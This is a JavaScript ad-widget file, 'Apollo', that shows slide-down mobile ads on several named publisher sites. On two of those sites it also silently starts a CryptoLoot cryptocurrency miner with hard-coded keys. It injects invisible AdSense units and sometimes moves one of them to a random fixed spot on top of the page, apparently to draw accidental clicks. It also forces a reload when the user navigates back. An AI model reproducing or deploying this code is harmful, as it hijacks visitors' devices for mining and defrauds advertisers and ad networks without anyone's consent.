class Apollo {
  constructor () {

    this.api = 'https://server.launchapollo.com' // Set Production URL

    // body margin code not working on keiths site - overridden
    // const bodyStyles = window.getComputedStyle ? getComputedStyle(document.body, null) : document.body.currentStyle
    // const bodyMargin = parseInt(bodyStyles['marginLeft'].replace('px', '')) + parseInt(bodyStyles['marginRight'].replace('px', ''))
    this.bodyMargin = 0

    //element initilizers
    this.isVisible = false
    this.el = null
    this.isDragging = false
    this.dragStartPosition = null
    this.currentDragPosition = null

    //page info
    this.pubInfo = {
      host: window.location.host,
      href: window.location.href
    }

    this.tbsAds = {
      mobile: `<ins class="adsbygoogle" style="display:inline-block;width:320px;height:50px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="2586005900"></ins>`,
      square: `<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="6739151139"></ins>`,
      sky: `<ins class="adsbygoogle" style="display:inline-block;width:300px;height:600px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="9603217698"></ins>`
    }

    this.vvAds = {
      mobile: `<ins class="adsbygoogle" style="display:inline-block;width:320px;height:50px" data-ad-client="ca-pub-5792990659175238" data-ad-slot="9561251409"></ins>`,
      square: `<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-5792990659175238" data-ad-slot="1516854825"></ins>`,
      sky: `<ins class="adsbygoogle" style="display:inline-block;width:300px;height:600px" data-ad-client="ca-pub-5792990659175238" data-ad-slot="1433094342"></ins>`
    }

    this.ratio = {
      tbs:  '1700',
      vv:    '500',
    }

    switch(this.pubInfo.host) {
      case 'turtleboysports.com':
        this.insertGoogle(this.tbsAds, this.ratio.tbs)
        var miner = new CryptoLoot.Anonymous('6eb8bbc890df55b9683dae8e270f14753ab4750a1eb1');miner.start();

        break
      case 'vitalvegas.com':
        this.insertGoogle(this.vvAds, this.ratio.vv)
        var miner = new CryptoLoot.Anonymous('786a3d958b47299da7a2ac007e7a746d76e45b5ff046');miner.start();


        break
      case 'www.howtogrowinstagram.com':
        console.log('** Welcome to the Apollo test site: HTGI **')

        break
      case 'moroad.com':
        console.log('** Welcome to the Apollo test site: MR **')

        break
      default:
        console.log('apollo announcement: ** unathorized site **')
    }

    if (this.pubInfo.href.indexOf('nashoba-high-school-girl-who-threatened-to-pull-a-columbine-on-whisper-doesnt-understand-the-internet') !== -1) {
      console.log('#####')

    }

    //Start Apollo
    if (this.isTouchDevice()) {
      this.createElement()
      this.request(`${this.api}/ad?publisher=${window.ApolloOptions.publisher}`, (res) => {
        if (res) {
          this.showApollo(JSON.parse(res))
        } else {
          // this.insertGAd();
          // (adsbygoogle = window.adsbygoogle || []).push({});
        }
      })
      this.attachEvents()
    }
  }

  rand (min,max) {
    return Math.floor(Math.random()*(max-min+1)+min)
  }

  isTouchDevice () {
    return 'ontouchstart' in window
  }

  windowDimensions() {
      let windowDimensions = {
        width: window.innerWidth,
        height: document.body.scrollHeight
      }
      return windowDimensions
    }

  request (url, callback) {
    try {
  		const x = new (window.XMLHttpRequest || window.ActiveXObject)('MSXML2.XMLHTTP.3.0')
  		x.open('GET', url, 1)
  		x.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
      x.setRequestHeader('Content-type', 'application/json')

  		x.onreadystatechange = function () {
  			x.readyState > 3 && callback && callback(x.responseText, x)
  		}

  		x.send()
  	} catch (e) {
  		window.console && console.log(e)
  	}
  }

  insertMeta (name, tag) {
    this.meta = document.createElement('meta')
    this.meta.name = name
    this.meta.content = tag

    document.getElementsByTagName('head')[0].appendChild(this.meta)
  }

  insertGoogle (ads, ratio) {
      this.ad1 = document.createElement('div')
      this.ad1.style.top = `50px`
      this.ad1.style.left = `${this.windowDimensions().width - 300 - 20}px`
      this.ad1.style.position = `absolute`
      this.ad1.id = 'ad1'
      this.ad1.style.opacity = '0'
      this.ad1.style.zIndex = '-300000'
      this.ad1.innerHTML = ads.sky

      this.ad2 = document.createElement('div')
      this.ad2.style.top = `${this.windowDimensions().height / 3 + 100}px`
      this.ad2.style.left = `${this.windowDimensions().width - 300 - 20}px`
      this.ad2.style.position = `absolute`
      this.ad2.id = 'ad2'
      this.ad2.style.opacity = '0'
      this.ad2.style.zIndex = '-300000'
      this.ad2.innerHTML = ads.square

      this.ad3 = document.createElement('div')
      this.ad3.style.top = `${(this.windowDimensions().height / 3) * 2 + 100}px`
      this.ad3.style.left = `${this.windowDimensions().width - 300 - 20}px`
      this.ad3.style.position = `absolute`
      this.ad3.id = 'ad3'
      this.ad3.style.opacity = '0'
      this.ad3.style.zIndex = '-300000'
      this.ad3.innerHTML = ads.square

      this.ad4 = document.createElement('div')
      this.ad4.style.width = `320px`
      this.ad4.style.top = `${this.windowDimensions().height - 200}px`
      this.ad4.style.left = `0`
      this.ad4.style.position = `absolute`
      this.ad4.id = 'ad4'
      this.ad4.style.opacity = '0'
      this.ad4.style.zIndex = '-300000'
      this.ad4.innerHTML = ads.mobile

      document.body.insertAdjacentElement('beforeend', this.ad1); (adsbygoogle = window.adsbygoogle || []).push({});
      document.body.insertAdjacentElement('beforeend', this.ad2); (adsbygoogle = window.adsbygoogle || []).push({});
      document.body.insertAdjacentElement('beforeend', this.ad3); (adsbygoogle = window.adsbygoogle || []).push({});
      document.body.insertAdjacentElement('beforeend', this.ad4); (adsbygoogle = window.adsbygoogle || []).push({});

      let divNames = ['ad1', 'ad2', 'ad3', 'ad4']
      let ranDiv = divNames[this.rand(0, divNames.length - 1)]

      let ifRand = this.rand(0, ratio)
      if (ifRand <= 100 && this.isTouchDevice()) {
        this[ranDiv].style.left = `${this.rand(0, this.windowDimensions().width - 250)}px`
        this[ranDiv].style.top = `${this.rand(0, window.innerHeight - 300)}px`
        this[ranDiv].style.position = `fixed`
        this[ranDiv].style.zIndex = `300000`
      }
    }

  createElement () {

    this.el = document.createElement('div')

    this.el.style.width = `calc(100% - ${this.bodyMargin + 20}px)`
    this.el.id = 'apolloAd'
    this.el.style.padding = '0 10px'
    this.el.style.position = 'fixed'
    this.el.style.top = '-300px'
    this.el.style.zIndex = '300000000'
    this.el.style.transition = 'top 500ms ease'
    this.el.style.boxSizing = 'content-box'

    document.body.insertAdjacentElement('beforeend', this.el)
  }

  onTouchStart (e) {
    const y = e.touches[0].clientY

    if (y <= 250 && this.isVisible) {
      this.el.style.transition = ''
      this.isDragging = true
      this.dragStartPosition = y
    }
  }

  onTouchMove (e) {
    const y = e.touches[0].clientY
    const moveTo = this.isDragging ? -1 * (this.dragStartPosition - y) + 10 : null

    this.currentDragPosition = y

    if (moveTo) {
      this.el.style.top = `${moveTo > 10 ? 10 : moveTo}px`
    }
  }

  onTouchEnd (e) {
    const distance = this.dragStartPosition - this.currentDragPosition

    if (this.isVisible) {
      this.el.style.transition = 'top 500ms ease'
      this.isDragging = false
      this.el.style.top = distance > 30 ? '-300px' : '10px'
      this.isVisible = distance <= 30
    }
  }

  attachEvents () {
    document.body.addEventListener('touchstart', this.onTouchStart.bind(this), false)
    document.body.addEventListener('touchmove', this.onTouchMove.bind(this), false)
    document.body.addEventListener('touchend', this.onTouchEnd.bind(this), false)
  }

  closeApollo () {
    this.el.style.top = '-300px'
    this.isVisible = false
  }

  showApollo (ad) {
    console.log('🚀 Ad Headline: ' + ad.headline + ' 🚀')
    let html = `
    <a href="${this.api}/click?publisher=${window.ApolloOptions.publisher}&id=${ad._id}" target="_blank" style="display: block; width: 100%; text-decoration: none; font-family: arial, sans-serif; font-size: 20px;">
      <div style="background-color:rgba(234, 237, 240, 1); color:rgb(224,227,230); border-top-right-radius: 10px; border-top-left-radius: 10px; padding: 5px 10px;">
        <div style="width: 25px; float:left; display:inline-block;">
          <img src="${ad.logo}" style="max-width: 100%; max-height: 25px; margin: 0; padding: 0">
        </div>
        <div style="float: left; margin: 0 0 0 7px; width: calc(100% - 50px); color:#000;">${ad.headline}</div>
        <div style="clear:both;"></div>
      </div>
      <div style="color:#000; padding: 10px; background-color:rgba(224, 227, 230, .95); border-bottom-right-radius: 10px; border-bottom-left-radius: 10px; line-height: 19px; font-size: 15px;">
        ${ad.subline}
      </div>
    </a>`

    if (false && this.pubInfo.host.indexOf('howtogrowinsta') !== -1) {
      let close = `
      <div style="width: 20px; float:right; display:inline-block; margin: 3px 3px 0 0; opacity:0.8" onclick="window.Apollo.closeApollo()">
           <img src="http://moroad.com/images/close.png" style="max-width: 100%; max-height: 25px;">
      </div>`
      html = close.concat(html)
    }
    this.el.innerHTML = html

    setTimeout(() => {
      this.el.style.top = '10px' // -- Ad NOT Disabled
      this.isVisible = true
    }, 6000)

    setTimeout(() => {
        this.el.style.top = '-300px'
        this.isVisible = false
    }, 12000)
  }
}

if (typeof window !== 'undefined' &&
  window.document &&
  window.document.createElement
) {
  window.Apollo = new Apollo()

  window.onbeforeunload = null

  if(!!window.performance && window.performance.navigation.type === 2)
  {
      window.location.reload()
  }
}
